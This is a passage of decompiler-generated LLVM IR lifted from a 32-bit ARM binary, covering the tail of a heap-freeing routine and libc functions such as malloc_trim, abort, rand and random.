  store i32 %v7_f130, i32* %v3_f134, align 4
  %v0_f138 = load i32, i32* @r5, align 4
  %v1_f138 = load i32, i32* %r2.global-to-local, align 4
  %v2_f138 = load i32, i32* %r1.global-to-local, align 4
  %v5_f138 = mul i32 %v2_f138, 4
  %v6_f138 = add i32 %v5_f138, %v1_f138
  %v7_f138 = inttoptr i32 %v6_f138 to i32*
  store i32 %v0_f138, i32* %v7_f138, align 4
  br label %dec_label_pc_f2a4

dec_label_pc_f140:                                ; preds = %dec_label_pc_f0c0
  %v1_f140 = and i32 %v3_f104, 2
  %v2_f140 = icmp eq i32 %v1_f140, 0
  br i1 %v2_f140, label %dec_label_pc_f148, label %dec_label_pc_f27c

dec_label_pc_f148:                                ; preds = %dec_label_pc_f140
  %v1_f148 = or i32 %v2_f108, 1
  store i32 %v1_f148, i32* %r3.global-to-local, align 4
  store i32 %v1_f148, i32* %v1_f108, align 4
  %v0_f150 = load i32, i32* @r6, align 4
  %v1_f150 = add i32 %v0_f150, -4
  %v2_f150 = inttoptr i32 %v1_f150 to i32*
  %v3_f150 = load i32, i32* %v2_f150, align 4
  store i32 %v3_f150, i32* %r3.global-to-local, align 4
  %v0_f154 = load i32, i32* @r5, align 4
  %v1_f154 = load i32, i32* %ip.global-to-local, align 4
  %v2_f154 = add i32 %v1_f154, %v0_f154
  store i32 %v2_f154, i32* %lr.global-to-local, align 4
  %v1_f158 = urem i32 %v3_f150, 2
  %v2_f158 = icmp eq i32 %v1_f158, 0
  %v1_f15c = add i32 %v2_f154, 4
  %v2_f15c = inttoptr i32 %v1_f15c to i32*
  %v3_f15c = load i32, i32* %v2_f15c, align 4
  store i32 %v3_f15c, i32* %r8.global-to-local, align 4
  br i1 %v2_f158, label %dec_label_pc_f164, label %dec_label_pc_f198

dec_label_pc_f164:                                ; preds = %dec_label_pc_f148
  %v1_f164 = add i32 %v0_f150, -8
  %v2_f164 = inttoptr i32 %v1_f164 to i32*
  %v3_f164 = load i32, i32* %v2_f164, align 4
  store i32 %v3_f164, i32* %r1.global-to-local, align 4
  %v2_f168 = sub i32 %v0_f154, %v3_f164
  store i32 %v2_f168, i32* %r3.global-to-local, align 4
  %v1_f16c = add i32 %v2_f168, 8
  %v2_f16c = inttoptr i32 %v1_f16c to i32*
  %v3_f16c = load i32, i32* %v2_f16c, align 4
  store i32 %v3_f16c, i32* %r2.global-to-local, align 4
  %v1_f170 = add i32 %v3_f16c, 12
  %v2_f170 = inttoptr i32 %v1_f170 to i32*
  %v3_f170 = load i32, i32* %v2_f170, align 4
  store i32 %v3_f170, i32* %r4.global-to-local, align 4
  %v9_f174 = icmp eq i32 %v3_f170, %v2_f168
  %v1_f178 = add i32 %v2_f168, 12
  %v2_f178 = inttoptr i32 %v1_f178 to i32*
  %v3_f178 = load i32, i32* %v2_f178, align 4
  store i32 %v3_f178, i32* %r0.global-to-local, align 4
  br i1 %v9_f174, label %dec_label_pc_f180, label %dec_label_pc_f1e4

dec_label_pc_f180:                                ; preds = %dec_label_pc_f164
  %v1_f180 = add i32 %v3_f178, 8
  %v2_f180 = inttoptr i32 %v1_f180 to i32*
  %v3_f180 = load i32, i32* %v2_f180, align 4
  store i32 %v3_f180, i32* %r3.global-to-local, align 4
  %v9_f184 = icmp eq i32 %v3_f180, %v2_f168
  br i1 %v9_f184, label %dec_label_pc_f18c, label %dec_label_pc_f1e4

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f180
  store i32 %v3_f16c, i32* %v2_f180, align 4
  %v0_f190 = load i32, i32* %r0.global-to-local, align 4
  %v1_f190 = load i32, i32* %r2.global-to-local, align 4
  %v2_f190 = add i32 %v1_f190, 12
  %v3_f190 = inttoptr i32 %v2_f190 to i32*
  store i32 %v0_f190, i32* %v3_f190, align 4
  %v0_f194 = load i32, i32* %ip.global-to-local, align 4
  %v1_f194 = load i32, i32* %r1.global-to-local, align 4
  %v2_f194 = add i32 %v1_f194, %v0_f194
  store i32 %v2_f194, i32* %ip.global-to-local, align 4
  %v0_f1a4.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_f1a8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_f198

dec_label_pc_f198:                                ; preds = %dec_label_pc_f148, %dec_label_pc_f18c
  %v0_f224 = phi i32 [ %v1_f154, %dec_label_pc_f148 ], [ %v2_f194, %dec_label_pc_f18c ]
  %v0_f1a8 = phi i32 [ %v3_f15c, %dec_label_pc_f148 ], [ %v0_f1a8.pre, %dec_label_pc_f18c ]
  %v1_f1bc = phi i32 [ %v2_f154, %dec_label_pc_f148 ], [ %v0_f1a4.pre, %dec_label_pc_f18c ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f19c = load i32, i32* @r7, align 4
  %v2_f19c = add i32 %v0_f19c, 68
  %v3_f19c = inttoptr i32 %v2_f19c to i32*
  %v4_f19c = load i32, i32* %v3_f19c, align 4
  store i32 %v4_f19c, i32* %r2.global-to-local, align 4
  %v1_f1a0 = add i32 %v4_f19c, 44
  %v2_f1a0 = inttoptr i32 %v1_f1a0 to i32*
  %v3_f1a0 = load i32, i32* %v2_f1a0, align 4
  store i32 %v3_f1a0, i32* %r3.global-to-local, align 4
  %v9_f1a4 = icmp eq i32 %v1_f1bc, %v3_f1a0
  %v1_f1a8 = and i32 %v0_f1a8, -4
  store i32 %v1_f1a8, i32* %r0.global-to-local, align 4
  br i1 %v9_f1a4, label %dec_label_pc_f224, label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f198
  %v2_f1b0 = add i32 %v1_f1bc, %v1_f1a8
  store i32 %v2_f1b0, i32* %r3.global-to-local, align 4
  %v1_f1b4 = add i32 %v2_f1b0, 4
  %v2_f1b4 = inttoptr i32 %v1_f1b4 to i32*
  %v3_f1b4 = load i32, i32* %v2_f1b4, align 4
  store i32 %v3_f1b4, i32* %r3.global-to-local, align 4
  %v1_f1b8 = urem i32 %v3_f1b4, 2
  %v2_f1b8 = icmp eq i32 %v1_f1b8, 0
  %v2_f1bc = add i32 %v1_f1bc, 4
  %v3_f1bc = inttoptr i32 %v2_f1bc to i32*
  store i32 %v1_f1a8, i32* %v3_f1bc, align 4
  br i1 %v2_f1b8, label %dec_label_pc_f1c4, label %dec_label_pc_f1b0.dec_label_pc_f1f4_crit_edge

dec_label_pc_f1b0.dec_label_pc_f1f4_crit_edge:    ; preds = %dec_label_pc_f1b0
  %v0_f204.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f1f4

dec_label_pc_f1c4:                                ; preds = %dec_label_pc_f1b0
  %v0_f1c4 = load i32, i32* %lr.global-to-local, align 4
  %v1_f1c4 = add i32 %v0_f1c4, 8
  %v2_f1c4 = inttoptr i32 %v1_f1c4 to i32*
  %v3_f1c4 = load i32, i32* %v2_f1c4, align 4
  store i32 %v3_f1c4, i32* %r1.global-to-local, align 4
  %v1_f1c8 = add i32 %v3_f1c4, 12
  %v2_f1c8 = inttoptr i32 %v1_f1c8 to i32*
  %v3_f1c8 = load i32, i32* %v2_f1c8, align 4
  store i32 %v3_f1c8, i32* %r3.global-to-local, align 4
  %v9_f1cc = icmp eq i32 %v3_f1c8, %v0_f1c4
  %v1_f1d0 = add i32 %v0_f1c4, 12
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i32*
  %v3_f1d0 = load i32, i32* %v2_f1d0, align 4
  store i32 %v3_f1d0, i32* %r2.global-to-local, align 4
  br i1 %v9_f1cc, label %dec_label_pc_f1d8, label %dec_label_pc_f1e4

dec_label_pc_f1d8:                                ; preds = %dec_label_pc_f1c4
  %v1_f1d8 = add i32 %v3_f1d0, 8
  %v2_f1d8 = inttoptr i32 %v1_f1d8 to i32*
  %v3_f1d8 = load i32, i32* %v2_f1d8, align 4
  store i32 %v3_f1d8, i32* %r3.global-to-local, align 4
  %v9_f1dc = icmp eq i32 %v3_f1d8, %v0_f1c4
  br i1 %v9_f1dc, label %dec_label_pc_f1e8, label %dec_label_pc_f1e4

dec_label_pc_f1e4:                                ; preds = %dec_label_pc_f1c4, %dec_label_pc_f180, %dec_label_pc_f164, %dec_label_pc_f1d8
  %v0_f1e4 = call i32 @abort()
  store i32 %v0_f1e4, i32* %r0.global-to-local, align 4
  %v0_f1e8.pre = load i32, i32* @r1, align 4
  %v1_f1e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_f1e8

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_f1d8, %dec_label_pc_f1e4
  %v1_f1e8 = phi i32 [ %v3_f1d0, %dec_label_pc_f1d8 ], [ %v1_f1e8.pre, %dec_label_pc_f1e4 ]
  %v0_f1e8 = phi i32 [ %v3_f1c4, %dec_label_pc_f1d8 ], [ %v0_f1e8.pre, %dec_label_pc_f1e4 ]
  %v2_f1e8 = add i32 %v1_f1e8, 8
  %v3_f1e8 = inttoptr i32 %v2_f1e8 to i32*
  store i32 %v0_f1e8, i32* %v3_f1e8, align 4
  %v0_f1ec = load i32, i32* %r2.global-to-local, align 4
  %v1_f1ec = load i32, i32* %r1.global-to-local, align 4
  %v2_f1ec = add i32 %v1_f1ec, 12
  %v3_f1ec = inttoptr i32 %v2_f1ec to i32*
  store i32 %v0_f1ec, i32* %v3_f1ec, align 4
  %v0_f1f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_f1f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_f1f0 = add i32 %v1_f1f0, %v0_f1f0
  store i32 %v2_f1f0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_f1f4

dec_label_pc_f1f4:                                ; preds = %dec_label_pc_f1b0.dec_label_pc_f1f4_crit_edge, %dec_label_pc_f1e8
  %v0_f204 = phi i32 [ %v0_f204.pre, %dec_label_pc_f1b0.dec_label_pc_f1f4_crit_edge ], [ %v2_f1f0, %dec_label_pc_f1e8 ]
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f1f8 = load i32, i32* @r7, align 4
  %v2_f1f8 = add i32 %v0_f1f8, 68
  %v3_f1f8 = inttoptr i32 %v2_f1f8 to i32*
  %v4_f1f8 = load i32, i32* %v3_f1f8, align 4
  %v1_f1fc = add i32 %v4_f1f8, 52
  store i32 %v1_f1fc, i32* %r3.global-to-local, align 4
  %v1_f200 = add i32 %v4_f1f8, 60
  %v2_f200 = inttoptr i32 %v1_f200 to i32*
  %v3_f200 = load i32, i32* %v2_f200, align 4
  store i32 %v3_f200, i32* %r1.global-to-local, align 4
  %v1_f204 = or i32 %v0_f204, 1
  store i32 %v1_f204, i32* %r2.global-to-local, align 4
  %v1_f208 = load i32, i32* %r4.global-to-local, align 4
  %v2_f208 = add i32 %v1_f208, 12
  %v3_f208 = inttoptr i32 %v2_f208 to i32*
  store i32 %v1_f1fc, i32* %v3_f208, align 4
  %v0_f20c = load i32, i32* %r1.global-to-local, align 4
  %v1_f20c = load i32, i32* %r4.global-to-local, align 4
  %v2_f20c = add i32 %v1_f20c, 8
  %v3_f20c = inttoptr i32 %v2_f20c to i32*
  store i32 %v0_f20c, i32* %v3_f20c, align 4
  %v0_f210 = load i32, i32* %r2.global-to-local, align 4
  %v1_f210 = load i32, i32* %r4.global-to-local, align 4
  %v2_f210 = add i32 %v1_f210, 4
  %v3_f210 = inttoptr i32 %v2_f210 to i32*
  store i32 %v0_f210, i32* %v3_f210, align 4
  %v0_f214 = load i32, i32* %ip.global-to-local, align 4
  %v1_f214 = load i32, i32* %r4.global-to-local, align 4
  %v3_f214 = add i32 %v1_f214, %v0_f214
  %v4_f214 = inttoptr i32 %v3_f214 to i32*
  store i32 %v0_f214, i32* %v4_f214, align 4
  %v0_f218 = load i32, i32* %r4.global-to-local, align 4
  %v1_f218 = load i32, i32* %r1.global-to-local, align 4
  %v2_f218 = add i32 %v1_f218, 12
  %v3_f218 = inttoptr i32 %v2_f218 to i32*
  store i32 %v0_f218, i32* %v3_f218, align 4
  %v0_f21c = load i32, i32* %r4.global-to-local, align 4
  %v1_f21c = load i32, i32* %r3.global-to-local, align 4
  %v2_f21c = add i32 %v1_f21c, 8
  %v3_f21c = inttoptr i32 %v2_f21c to i32*
  store i32 %v0_f21c, i32* %v3_f21c, align 4
  br label %dec_label_pc_f234

dec_label_pc_f224:                                ; preds = %dec_label_pc_f198
  %v2_f224 = add i32 %v1_f1a8, %v0_f224
  store i32 %v2_f224, i32* %ip.global-to-local, align 4
  %v1_f228 = or i32 %v2_f224, 1
  store i32 %v1_f228, i32* %r3.global-to-local, align 4
  %v0_f22c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_f22c, i32* %v2_f1a0, align 4
  %v0_f230 = load i32, i32* %r3.global-to-local, align 4
  %v1_f230 = load i32, i32* %r4.global-to-local, align 4
  %v2_f230 = add i32 %v1_f230, 4
  %v3_f230 = inttoptr i32 %v2_f230 to i32*
  store i32 %v0_f230, i32* %v3_f230, align 4
  br label %dec_label_pc_f234

dec_label_pc_f234:                                ; preds = %dec_label_pc_f1f4, %dec_label_pc_f224
  %v0_f234 = load i32, i32* %ip.global-to-local, align 4
  %v3_f238 = icmp ult i32 %v0_f234, 131070
  br i1 %v3_f238, label %dec_label_pc_f2a4, label %dec_label_pc_f23c

dec_label_pc_f23c:                                ; preds = %dec_label_pc_f234
  store i32 68, i32* %r3.global-to-local, align 4
  %v0_f240 = load i32, i32* @r7, align 4
  %v2_f240 = add i32 %v0_f240, 68
  %v3_f240 = inttoptr i32 %v2_f240 to i32*
  %v4_f240 = load i32, i32* %v3_f240, align 4
  store i32 %v4_f240, i32* @r4, align 4
  %v1_f244 = inttoptr i32 %v4_f240 to i32*
  %v2_f244 = load i32, i32* %v1_f244, align 4
  store i32 %v2_f244, i32* %r3.global-to-local, align 4
  %v1_f248 = and i32 %v2_f244, 2
  %v2_f248 = icmp eq i32 %v1_f248, 0
  br i1 %v2_f248, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_f23c
  store i32 %v4_f240, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_f23c, %bb
  %v1_f250 = xor i1 %v2_f248, true
  call void @__pseudo_cond_branch(i1 %v1_f250, i32 ptrtoint (i32* @global_var_eef4.571 to i32))
  %v0_f254 = load i32, i32* @r4, align 4
  %v1_f254 = add i32 %v0_f254, 44
  %v2_f254 = inttoptr i32 %v1_f254 to i32*
  %v3_f254 = load i32, i32* %v2_f254, align 4
  store i32 %v3_f254, i32* %r3.global-to-local, align 4
  %v1_f258 = add i32 %v3_f254, 4
  %v2_f258 = inttoptr i32 %v1_f258 to i32*
  %v3_f258 = load i32, i32* %v2_f258, align 4
  store i32 %v3_f258, i32* %r3.global-to-local, align 4
  %v1_f25c = add i32 %v0_f254, 836
  %v2_f25c = inttoptr i32 %v1_f25c to i32*
  %v3_f25c = load i32, i32* %v2_f25c, align 4
  store i32 %v3_f25c, i32* %r2.global-to-local, align 4
  %v1_f260 = and i32 %v3_f258, -4
  store i32 %v1_f260, i32* %r3.global-to-local, align 4
  %v3_f264 = icmp ult i32 %v1_f260, %v3_f25c
  br i1 %v3_f264, label %dec_label_pc_f2a4, label %dec_label_pc_f26c

dec_label_pc_f26c:                                ; preds = %bb16
  store i32 %v0_f254, i32* %r1.global-to-local, align 4
  %v1_f270 = add i32 %v0_f254, 840
  %v2_f270 = inttoptr i32 %v1_f270 to i32*
  %v3_f270 = load i32, i32* %v2_f270, align 4
  store i32 %v3_f270, i32* %r0.global-to-local, align 4
  %v2_f274 = call i32 @__malloc_trim(i32 %v3_f270, i32 %v0_f254)
  store i32 %v2_f274, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f2a4

dec_label_pc_f27c:                                ; preds = %dec_label_pc_f140
  %v2_f27c = inttoptr i32 %v1_f110 to i32*
  %v3_f27c = load i32, i32* %v2_f27c, align 4
  store i32 %v3_f27c, i32* %r0.global-to-local, align 4
  %v1_f280 = add i32 %v4_f100, 848
  %v2_f280 = inttoptr i32 %v1_f280 to i32*
  %v3_f280 = load i32, i32* %v2_f280, align 4
  store i32 %v3_f280, i32* %r2.global-to-local, align 4
  %v1_f284 = add i32 %v4_f100, 868
  %v2_f284 = inttoptr i32 %v1_f284 to i32*
  %v3_f284 = load i32, i32* %v2_f284, align 4
  %v2_f288 = add i32 %v3_f27c, %v1_f10c
  store i32 %v2_f288, i32* %r1.global-to-local, align 4
  %v1_f28c = add i32 %v3_f280, -1
  store i32 %v1_f28c, i32* %r2.global-to-local, align 4
  %v2_f290 = sub i32 %v3_f284, %v2_f288
  store i32 %v2_f290, i32* %r3.global-to-local, align 4
  store i32 %v2_f290, i32* %v2_f284, align 4
  %v1_f298 = load i32, i32* @lr, align 4
  %v2_f298 = add i32 %v1_f298, 848
  %v3_f298 = inttoptr i32 %v2_f298 to i32*
  store i32 %v1_f28c, i32* %v3_f298, align 4
  %v0_f29c = load i32, i32* %r0.global-to-local, align 4
  %v1_f29c = load i32, i32* @r5, align 4
  %v2_f29c = sub i32 %v1_f29c, %v0_f29c
  store i32 %v2_f29c, i32* %r0.global-to-local, align 4
  %v4_f2a0 = call i32 @munmap(i32 %v2_f29c, i32 %v2_f288, i32 %v1_f28c, i32 %v2_f290)
  store i32 %v4_f2a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f2a4

dec_label_pc_f2a4:                                ; preds = %bb16, %dec_label_pc_f234, %dec_label_pc_f26c, %dec_label_pc_f120, %dec_label_pc_f27c
  store i32 %v2_f0b4, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 48, i32* @r3, align 4
  %v0_f2b0 = load i32, i32* @r7, align 4
  %v2_f2b0 = add i32 %v0_f2b0, 48
  %v3_f2b0 = inttoptr i32 %v2_f2b0 to i32*
  %v4_f2b0 = load i32, i32* %v3_f2b0, align 4
  store i32 %v4_f2b0, i32* @ip, align 4
  store i32 62140, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_f2b0)
  br label %dec_label_pc_f2bc

dec_label_pc_f2bc:                                ; preds = %entry, %dec_label_pc_f2a4
  store i32 %v3_f0a8, i32* @r4, align 4
  store i32 %v6_f0a8, i32* @r5, align 4
  store i32 %v9_f0a8, i32* @r6, align 4
  store i32 %v12_f0a8, i32* @r7, align 4
  store i32 %v18_f0a8, i32* @lr, align 4
  ret i32 %v2_f0b4

; uselistorder directives
  uselistorder i32 %v0_f254, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_f214, { 1, 0 }
  uselistorder i32 %v1_f154, { 1, 0 }
  uselistorder i32 %v0_f154, { 1, 0 }
  uselistorder i32 %v3_f128, { 1, 0 }
  uselistorder i32 %v1_f10c, { 1, 0, 2 }
  uselistorder i32 %v2_f108, { 1, 2, 0, 3 }
  uselistorder i32 %v4_f100, { 1, 0, 2, 3 }
  uselistorder i32 %v0_f0b0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 6, 5, 7, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 868, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 848, { 3, 4, 0, 1, 2 }
  uselistorder i32 840, { 1, 2, 0 }
  uselistorder i32 836, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_f2bc, { 1, 0 }
  uselistorder label %dec_label_pc_f2a4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_f234, { 1, 0 }
  uselistorder label %dec_label_pc_f1f4, { 1, 0 }
  uselistorder label %dec_label_pc_f1e8, { 1, 0 }
  uselistorder label %dec_label_pc_f1e4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_f198, { 1, 0 }
}

define i32 @function_f2cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2cc:
  %v0_f2cc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f2cc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_f2cc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_f2cc, %bb
  %v10_f2e0 = phi i32 [ %arg1, %dec_label_pc_f2cc ], [ 0, %bb ]
  ret i32 %v10_f2e0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_f2e4 = load i32, i32* @r4, align 4
  store i32 %v3_f2e4, i32* %stack_var_-12, align 4
  %v6_f2e4 = load i32, i32* @r5, align 4
  %v4_f2f4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), align 4
  store i32 %v4_f2f4, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_f2f4, i32* @r0, align 4
  %v0_f304 = call i32 @__malloc_consolidate()
  %v0_f308 = load i32, i32* @r4, align 4
  %v0_f30c = load i32, i32* @r5, align 4
  %v2_f314 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f314, i32* @r4, align 4
  store i32 %v6_f2e4, i32* @r5, align 4
  %v2_f318 = call i32 @__malloc_trim(i32 %v0_f308, i32 %v0_f30c)
  %v0_f31c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f31c, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_f320 = phi i32 [ %v2_f318, %entry ], [ 0, %bb ]
  ret i32 %v4_f320

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 68) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r5, align 4
  %v4_f33c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 16) to i32*), align 4
  store i32 62280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f33c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_f364 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_f36c = load i32, i32* @r5, align 4
  %v2_f36c = add i32 %v0_f36c, 11580
  %v3_f36c = inttoptr i32 %v2_f36c to i32*
  %v4_f36c = load i32, i32* %v3_f36c, align 4
  %v2_f370 = icmp eq i32 %v4_f36c, 0
  br i1 %v2_f370, label %dec_label_pc_f378, label %dec_label_pc_f3b8

dec_label_pc_f378:                                ; preds = %entry
  store i32 1, i32* %v3_f36c, align 4
  br label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f3c8, %dec_label_pc_f378
  %v0_f384 = load i32, i32* @r5, align 4
  %v2_f384 = add i32 %v0_f384, 1548
  store i32 %v2_f384, i32* @r4, align 4
  %v2_f390 = add i32 %v0_f384, 72
  %v3_f390 = inttoptr i32 %v2_f390 to i32*
  %v4_f390 = load i32, i32* %v3_f390, align 4
  call void @__pseudo_branch(i32 %v4_f390)
  %v1_f3a0 = call i32 @__GI_raise(i32 6)
  %v0_f3ac = load i32, i32* @r5, align 4
  %v2_f3ac = add i32 %v0_f3ac, 16
  %v3_f3ac = inttoptr i32 %v2_f3ac to i32*
  %v4_f3ac = load i32, i32* %v3_f3ac, align 4
  store i32 62392, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f3ac)
  %v0_f3bc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %entry, %dec_label_pc_f380
  %v1_f3d0 = phi i32 [ %v0_f36c, %entry ], [ %v0_f3bc.pre, %dec_label_pc_f380 ]
  %v2_f3bc = add i32 %v1_f3d0, 11580
  %v3_f3bc = inttoptr i32 %v2_f3bc to i32*
  %v4_f3bc = load i32, i32* %v3_f3bc, align 4
  %v7_f3c0 = icmp eq i32 %v4_f3bc, 1
  br i1 %v7_f3c0, label %dec_label_pc_f3c8, label %dec_label_pc_f404

dec_label_pc_f3c8:                                ; preds = %dec_label_pc_f3b8
  %v2_f3c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_f3c8, i32* @r4, align 4
  store i32 2, i32* %v3_f3bc, align 4
  %v3_f3e0 = bitcast i32* %stack_var_-28 to i8*
  %v4_f3e0 = call i32 @__GI_memset(i8* %v3_f3e0, i32 0, i32 20)
  %v3_f3fc = call i32 @__libc_sigaction(i32 6, i32 %v2_f3c8, i32 0)
  br label %dec_label_pc_f380

dec_label_pc_f404:                                ; preds = %dec_label_pc_f3b8
  %v7_f404 = icmp eq i32 %v4_f3bc, 2
  br i1 %v7_f404, label %dec_label_pc_f40c, label %dec_label_pc_f418

dec_label_pc_f40c:                                ; preds = %dec_label_pc_f404
  store i32 3, i32* %v3_f3bc, align 4
  %v0_f414 = call i32 @abort()
  %v0_f418.pre = load i32, i32* @r5, align 4
  %v1_f418.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %dec_label_pc_f404, %dec_label_pc_f40c
  %v3_f424 = phi i32 [ 11580, %dec_label_pc_f404 ], [ %v1_f418.pre, %dec_label_pc_f40c ]
  %v2_f424 = phi i32 [ %v1_f3d0, %dec_label_pc_f404 ], [ %v0_f418.pre, %dec_label_pc_f40c ]
  %v2_f418 = add i32 %v2_f424, %v3_f424
  %v3_f418 = inttoptr i32 %v2_f418 to i32*
  %v4_f418 = load i32, i32* %v3_f418, align 4
  %v7_f41c = icmp eq i32 %v4_f418, 3
  br i1 %v7_f41c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_f418
  store i32 4, i32* %v3_f418, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f418, %bb
  call void @__pseudo_cond_branch(i1 %v7_f41c, i32 ptrtoint (i32* @global_var_1202c.581 to i32))
  br label %dec_label_pc_f430

dec_label_pc_f430:                                ; preds = %dec_label_pc_f430, %.thread2
  %v0_f430 = call i32 @abort()
  br label %dec_label_pc_f430

; uselistorder directives
  uselistorder i32* %v3_f3bc, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_f418, { 1, 0 }
  uselistorder label %dec_label_pc_f3b8, { 1, 0 }
}

define i32 @function_f43c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f43c:
  %v0_f43c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f43c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_f43c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_f43c, %bb
  %v4_f448 = phi i32 [ %arg1, %dec_label_pc_f43c ], [ 0, %bb ]
  ret i32 %v4_f448

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_f454 = call i32 @random()
  ret i32 %v0_f454
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_f464 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_24010.405 to i32), i32* @r4, align 4
  %v4_f494 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24010.405 to i32), i32 120) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_f494)
  %v0_f4a8 = load i32, i32* @r4, align 4
  %v2_f4a8 = add i32 %v0_f4a8, 16
  %v3_f4a8 = inttoptr i32 %v2_f4a8 to i32*
  %v4_f4a8 = load i32, i32* %v3_f4a8, align 4
  store i32 ptrtoint (i32* @global_var_f4b4.587 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_f4a8)
  %v2_f4b8 = ptrtoint i32* %stack_var_-20 to i32
  %v0_f4bc = load i32, i32* @r4, align 4
  %v2_f4bc = add i32 %v0_f4bc, 1724
  %v2_f4c0 = inttoptr i32 %v2_f4bc to i32*
  %v3_f4c0 = call i32 @__GI_random_r(i32* %v2_f4c0, i32 %v2_f4b8)
  %v0_f4d0 = load i32, i32* @r4, align 4
  %v2_f4d0 = add i32 %v0_f4d0, 48
  %v3_f4d0 = inttoptr i32 %v2_f4d0 to i32*
  %v4_f4d0 = load i32, i32* %v3_f4d0, align 4
  call void @__pseudo_branch(i32 %v4_f4d0)
  %v3_f4dc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_f464, i32* @r4, align 4
  ret i32 %v3_f4dc
}

define i32 @function_f4f0(i16* %arg1) local_unnamed_addr {
dec_label_pc_f4f0:
  %v0_f4f0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f4f0, label %.thread3, label %.thread4

.thread3:                                         ; preds = %dec_label_pc_f4f0
  call void @llvm.trap()
  unreachable

.thread4:                                         ; preds = %dec_label_pc_f4f0
  %tmp = ptrtoint i16* %arg1 to i32
